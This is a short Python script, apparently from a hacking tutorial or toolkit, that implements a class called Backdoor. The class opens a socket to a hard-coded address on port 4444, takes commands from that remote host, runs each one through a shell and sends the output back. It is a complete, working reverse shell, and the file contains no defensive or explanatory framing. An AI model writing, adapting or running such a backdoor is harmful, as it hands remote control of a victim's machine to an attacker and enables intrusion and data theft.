#!/usr/bin/env python
import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, p):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, p))

    def send_data(self, data):
        pack_data = json.dumps(data.decode("utf-8"))
        self.s.send(pack_data.encode("utf-8"))

    def recv_data(self):
        pack_data = ""
        while True:
            try:
                pack_data = self.s.recv(1024)
                return json.loads(pack_data)
            except ValueError:
                continue

    def execute(self, cmd):
        return subprocess.check_output(cmd, shell=True)

    def start(self):
        while True:
            cmd = self.recv_data()
            output = self.execute(cmd)
            self.send_data(output)
        self.s.close()


talk = Backdoor("192.168.1.17", 4444)
talk.start()
